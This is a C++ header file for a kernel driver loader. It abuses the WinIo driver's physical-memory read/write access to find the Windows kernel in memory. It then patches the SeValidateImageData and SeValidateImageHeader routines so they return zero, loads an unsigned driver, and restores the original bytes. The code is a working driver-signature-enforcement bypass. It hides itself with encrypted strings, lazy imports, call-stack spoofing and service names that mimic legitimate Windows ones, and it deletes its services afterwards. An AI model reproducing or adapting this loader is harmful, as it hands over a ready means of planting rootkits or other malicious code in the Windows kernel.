#pragma once
#pragma warning(disable: 4996)
#include <Windows.h>
#include <iostream>
#include <string>
#include <random>
#include <fstream> 
#include "lazy.h"


typedef unsigned long u32;
typedef unsigned long long u64;

#define IOCTL_MAP 0x80102040
#define IOCTL_UNMAP 0x80102044

#define PATTERN_SEARCH_RANGE 0xBFFFFF
#define DRIVER_NAME_LEN 16

char se_validate_image_data_original[6] = { 0x00,0x00,0x00,0x00,0x00,0x00 };
char se_validate_image_header_original[6] = { 0x00,0x00,0x00,0x00,0x00,0x00 };

unsigned char se_validate_image_data_pattern[17] = { 0x48, 0x83, 0xEC, 0x48, 0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xD1, 0x48, 0x85, 0xC0 };
unsigned char se_validate_image_header_pattern[21] = { 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x57, 0x48, 0x81, 0xEC, 0xA0, 0x00, 0x00, 0x00, 0x33, 0xF6 };

uint8_t patch2[6] = {
	0xB8, 0x00, 0x00, 0x00, 0x00, // mov rax, 0
	0xC3                          // ret
};

u64 driver_handlee = -1;
char winio_path[FILENAME_MAX];

struct winio_packet
{
	u64 size;
	u64 phys_address;
	u64 phys_handle;
	u64 phys_linear;
	u64 phys_section;
};

u64 phys_map(winio_packet& packet)
{
	SPOOF_FUNC
		u32 bytes_returned;
	if (!DeviceIoControl((void*)driver_handlee, IOCTL_MAP, &packet, sizeof(winio_packet), &packet, sizeof(winio_packet), &bytes_returned, NULL))
		return NULL;

	return packet.phys_linear;
}

bool phys_unmap(winio_packet& packet)
{
	SPOOF_FUNC
		u32 bytes_returned;
	if (!DeviceIoControl((void*)driver_handlee, IOCTL_UNMAP, &packet, sizeof(winio_packet), NULL, 0, &bytes_returned, NULL))
		return false;

	return true;
}

bool read_phys(u64 addr, u64 buf, u64 size)
{
	SPOOF_FUNC
		winio_packet packet;
	packet.phys_address = addr;
	packet.size = size;

	u64 linear_address = phys_map(packet);
	if (linear_address == NULL)
		return false;

	if (IsBadReadPtr((void*)linear_address, 1))
		return false;

	memcpy((void*)buf, (void*)linear_address, size);

	phys_unmap(packet);
	return true;
}


bool write_phys(u64 addr, u64 buf, u64 size)
{
	SPOOF_FUNC
		winio_packet packet;
	packet.phys_address = addr;
	packet.size = size;

	u64 linear_address = phys_map(packet);
	if (linear_address == NULL)
		return false;

	if (IsBadReadPtr((void*)linear_address, 1))
		return false;

	memcpy((void*)linear_address, (void*)buf, size);

	phys_unmap(packet);
	return true;
}

u64 find_pattern(u64 start, u64 range, unsigned char* pattern, size_t pattern_length)
{
	SPOOF_FUNC
		u64 buf = (u64)malloc(range);
	read_phys(start, (u64)buf, range);

	u64 result = 0;
	for (int i = 0; i < range; i++)
	{
		bool vtn = true;
		for (int j = 0; j < pattern_length; j++)
		{
			if (vtn && pattern[j] != 0x00 && *(unsigned char*)(buf + i + j) != pattern[j])
			{
				vtn = false;
			}
		}

		if (vtn)
		{
			result = start + i;
			goto ret;
		}
	}

ret:
	free((void*)buf);
	return result;
}

bool file_exists(const std::string path) {
	SPOOF_FUNC
		DWORD v0 = LI_FN(GetFileAttributesA)(path.c_str());
	return v0 != -1 && !(v0 & 0x00000010);
}

std::string GenerateRandomString(int length) {
	SPOOF_FUNC
		const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	const int max_index = sizeof(charset) - 1;
	std::string random_string;

	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> dis(0, max_index);

	for (int i = 0; i < length; ++i) {
		random_string += charset[dis(gen)];
	}

	return random_string;
}

inline int custom_strlenrr(const char* string)
{
	SPOOF_FUNC
		int cnt = 0;
	if (string)
	{
		for (; *string != 0; ++string) ++cnt;
	}
	return cnt;
}

void load_driver_lazy(const char* driver_name, const char* bin_path)
{
	SPOOF_FUNC
		u64 cmdline_create_buf = (u64)malloc(custom_strlenrr(driver_name) + custom_strlenrr(bin_path) + 53);
	u64 cmdline_start_buf = (u64)malloc(custom_strlenrr(driver_name) + 14);
	sprintf((char*)cmdline_create_buf, "sc create %s binpath=\"%s\" type=kernel >NUL", driver_name, bin_path);
	sprintf((char*)cmdline_start_buf, "sc start %s >NUL", driver_name);
	LI_FN(system)((char*)cmdline_create_buf);
	LI_FN(system)((char*)cmdline_start_buf);
}
#include "api/c_xor.hpp"
void LoadThatFuckingDriver(const char* DriverPath, const char* ServiceName, const char* WinIOPath)
{
	if (!file_exists(DriverPath))
	{
		printf(E("[!] could not find your driver. >NUL"));
		Custom::Text(xorstr_("FAILED TO PATCH MEM [ERROR CODE - 42]"));
		LI_FN(system)("pause ");
		return;
	}

	auto WinIoHandle = E("\\\\.\\WinIo");

LOAD_WINIO:
	driver_handlee = (u64)CreateFileA(WinIoHandle.decrypt(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); WinIoHandle.encrypt();
	if (driver_handlee == -1)
	{
		strcat(winio_path, WinIOPath);

		if (!file_exists(winio_path))
		{
			Custom::Text(xorstr_("FAILED TO PATCH MEM [ERROR CODE - 43]"));
			LI_FN(system)("pause>NUL");
			exit(0);
		}

		auto string1 = E("sc stop winio >NUL");
		auto string2 = E("sc delete winio >NUL");
		auto string3 = E("winio >NUL");

		LI_FN(system)(string1.decrypt()); string1.encrypt();
		LI_FN(system)(string2.decrypt()); string2.encrypt();

		load_driver_lazy(string3.decrypt(), winio_path); string3.encrypt();
		goto LOAD_WINIO;
	}

	u64 ntos_base_pa = 0;
	for (u64 i = 0x000000000; i < 0x200000000; i += 0x000100000)
	{
		char* buf = (char*)malloc(2);
		read_phys(i, (u64)buf, 2);

		if (buf[0] == 'M' && buf[1] == 'Z')
		{
			ntos_base_pa = i;
			break;
		}

		free(buf);
	}

	if (!ntos_base_pa)
	{
		LI_FN(system)(E("pause >NUL"));
		return;
	}

	// find target physical addresses for patch
	u64 se_validate_image_data_pa = find_pattern(ntos_base_pa, PATTERN_SEARCH_RANGE, (unsigned char*)&se_validate_image_data_pattern, sizeof(se_validate_image_data_pattern));
	u64 se_validate_image_header_pa = find_pattern(ntos_base_pa, PATTERN_SEARCH_RANGE, (unsigned char*)&se_validate_image_header_pattern, sizeof(se_validate_image_header_pattern));
	if (se_validate_image_data_pa == 0 || se_validate_image_header_pa == 0)
	{
		LI_FN(system)(E("pause >NUL"));
		return;
	}

	// save original bytes
	read_phys(se_validate_image_data_pa, (u64)&se_validate_image_data_original, sizeof(se_validate_image_data_original));
	read_phys(se_validate_image_header_pa, (u64)&se_validate_image_header_original, sizeof(se_validate_image_header_original));

	// patch both routines to return zero
	write_phys(se_validate_image_data_pa, (u64)&patch2, sizeof(patch2));
	write_phys(se_validate_image_header_pa, (u64)&patch2, sizeof(patch2));

	// start the target driver
	load_driver_lazy(ServiceName, DriverPath);

	write_phys(se_validate_image_data_pa, (u64)&se_validate_image_data_original, sizeof(se_validate_image_data_original));
	write_phys(se_validate_image_header_pa, (u64)&se_validate_image_header_original, sizeof(se_validate_image_header_original));

	auto string1 = E("sc stop winio>NUL");
	auto string2 = E("sc delete winio>NUL");

	LI_FN(system)(string1.decrypt()); string1.encrypt();
	LI_FN(system)(string2.decrypt()); string2.encrypt();

	Sleep(500);

	Custom::Text(xorstr_("Patch Memory Loaded!!!"));
	Sleep(500);

}

void windows_service(const char* driver_path, const char* WINIOPATH)
{
	SPOOF_FUNC
		auto ServiceName = E("cfmifs");
	system(c_xor("sc delete cfmifs >NUL"));
	system(c_xor("sc delete dautil >NUL"));
	LoadThatFuckingDriver(driver_path, ServiceName, WINIOPATH);

	ServiceName.clear();
}
